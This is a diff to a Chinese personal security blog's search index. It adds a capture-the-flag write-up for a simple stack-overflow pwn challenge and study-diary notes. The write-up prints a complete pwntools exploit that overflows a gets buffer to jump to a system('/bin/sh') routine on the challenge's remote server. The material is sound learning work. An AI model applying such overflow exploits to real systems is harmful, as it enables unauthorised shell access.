@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>攻防世界pwn-反应釜开关</title>
+      <link href="/ctf-pwn/c42410d2.html"/>
+      <url>/ctf-pwn/c42410d2.html</url>
+      
+        <content type="html"><![CDATA[<p>(简单的栈溢出)<br>checksec查看附件如下:<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230904210354.png" style="zoom:80%;" /><br>开启了内存不可执行以及部分重定位. 直接运行本程序, 如图所示, 题目中直接给出了一个地址, 不知道能不能利用.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230904211159.png" style="zoom:80%;" /><br>用IDA打开附件查看, 逻辑比较清晰, 其中有<code>system(&#39;/bin/sh&#39;)</code>, 而且有<code>gets</code>函数, 可以直接溢出然后跳转执行.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230904211836.png" style="zoom:80%;" /><br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230904211856.png" style="zoom:80%;" /><br><code>v5</code>长度为512, 构造payload<code>b&#39;a&#39; * 512 + b&#39;a&#39; * 8 + p64(shell_addr)</code><br>完整exp如下:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment"># sh = process('./fanyin')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'61.147.171.105'</span><span class="token punctuation">,</span> <span class="token number">51859</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./fanyin'</span><span class="token punctuation">)</span>shell_addr <span class="token operator">=</span> <span class="token number">0x4005F6</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">512</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> PWN </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>攻防世界pwn-pwn1</title>
       <link href="/ctf-pwn/1bdd2aa8.html"/>
       <url>/ctf-pwn/1bdd2aa8.html</url>
@@ -208,7 +233,7 @@
       <link href="/undefined/7ed5fe30.html"/>
       <url>/undefined/7ed5fe30.html</url>
       
-        <content type="html"><![CDATA[<h1 id="2023"><a href="#2023" class="headerlink" title="2023"></a>2023</h1><h2 id="09-02"><a href="#09-02" class="headerlink" title="09.02"></a>09.02</h2><p><a href="https://blog.yangsx.cn/ctf-pwn/1bdd2aa8.html">攻防世界pwn-pwn1 | 小哑师兄 (yangsx.cn)</a></p><h2 id="08-31"><a href="#08-31" class="headerlink" title="08.31"></a>08.31</h2><p>八月的最后一天看了点got利用的pwn, got和plt也理解了, 但是在pwn中的利用还是不太会, 怎么去泄漏地址还没掌握.</p><p>整个八月的成长不是很大, 希望自己接下来真的能静下心来去学习去提升自己.</p><h2 id="08-25-08-27"><a href="#08-25-08-27" class="headerlink" title="08.25-08.27"></a>08.25-08.27</h2><p>周六日好好休息了下, 顺带补网络的基础知识. 28, 29因为外出工作摸不到电脑, 搁置了.</p><h2 id="08-24"><a href="#08-24" class="headerlink" title="08.24"></a>08.24</h2><p>今天就是G, 本来今天调休, 结果另有工作安排, 然后对接工作的人快要下班的时候才来交东西加班到比较晚才下班. 在此期间只能像个木头一样干熬. 😅</p><h2 id="08-23"><a href="#08-23" class="headerlink" title="08.23"></a>08.23</h2><p>又去看plt和got表, Linux的知识储备太少了. 攻防世界做pwn题, 没弄完. HW最后一天杂事比较多, 第一次HW, 也是以甲方身份参加, 很多活都是乙方的, 自己感受不是那么深</p><h2 id="08-22"><a href="#08-22" class="headerlink" title="08.22"></a>08.22</h2><p>正好不是我的班, 开开心心去找对象玩了</p><h2 id="08-21"><a href="#08-21" class="headerlink" title="08.21"></a>08.21</h2><p>今天下午鼓捣了博客 尝试腾讯serverless部署博客, 访问很快, 但是需要cdn绑定到自己的域名. 复现qq的rce, 就大佬不知道咋挖出来的. 尝试给博客搞google收录, 但是google一直读不到sitemap, 其他检测网站可以正常读取. </p><h2 id="07-20-08-20"><a href="#07-20-08-20" class="headerlink" title="07.20-08.20"></a>07.20-08.20</h2><p>陆陆续续在刷攻防世界的pwn,但整体效率不高</p>]]></content>
+        <content type="html"><![CDATA[<h1 id="2023"><a href="#2023" class="headerlink" title="2023"></a>2023</h1><h2 id="09-04"><a href="#09-04" class="headerlink" title="09.04"></a>09.04</h2><p><a href="https://blog.yangsx.cn/ctf-pwn/c42410d2.html">攻防世界pwn-反应釜 | 小哑师兄 (yangsx.cn)</a></p><h2 id="09-02"><a href="#09-02" class="headerlink" title="09.02"></a>09.02</h2><p><a href="https://blog.yangsx.cn/ctf-pwn/1bdd2aa8.html">攻防世界pwn-pwn1 | 小哑师兄 (yangsx.cn)</a></p><h2 id="08-31"><a href="#08-31" class="headerlink" title="08.31"></a>08.31</h2><p>八月的最后一天看了点got利用的pwn, got和plt也理解了, 但是在pwn中的利用还是不太会, 怎么去泄漏地址还没掌握.</p><p>整个八月的成长不是很大, 希望自己接下来真的能静下心来去学习去提升自己.</p><h2 id="08-25-08-27"><a href="#08-25-08-27" class="headerlink" title="08.25-08.27"></a>08.25-08.27</h2><p>周六日好好休息了下, 顺带补网络的基础知识. 28, 29因为外出工作摸不到电脑, 搁置了.</p><h2 id="08-24"><a href="#08-24" class="headerlink" title="08.24"></a>08.24</h2><p>今天就是G, 本来今天调休, 结果另有工作安排, 然后对接工作的人快要下班的时候才来交东西加班到比较晚才下班. 在此期间只能像个木头一样干熬. 😅</p><h2 id="08-23"><a href="#08-23" class="headerlink" title="08.23"></a>08.23</h2><p>又去看plt和got表, Linux的知识储备太少了. 攻防世界做pwn题, 没弄完. HW最后一天杂事比较多, 第一次HW, 也是以甲方身份参加, 很多活都是乙方的, 自己感受不是那么深</p><h2 id="08-22"><a href="#08-22" class="headerlink" title="08.22"></a>08.22</h2><p>正好不是我的班, 开开心心去找对象玩了</p><h2 id="08-21"><a href="#08-21" class="headerlink" title="08.21"></a>08.21</h2><p>今天下午鼓捣了博客 尝试腾讯serverless部署博客, 访问很快, 但是需要cdn绑定到自己的域名. 复现qq的rce, 就大佬不知道咋挖出来的. 尝试给博客搞google收录, 但是google一直读不到sitemap, 其他检测网站可以正常读取. </p><h2 id="07-20-08-20"><a href="#07-20-08-20" class="headerlink" title="07.20-08.20"></a>07.20-08.20</h2><p>陆陆续续在刷攻防世界的pwn,但整体效率不高</p>]]></content>
       
       
       
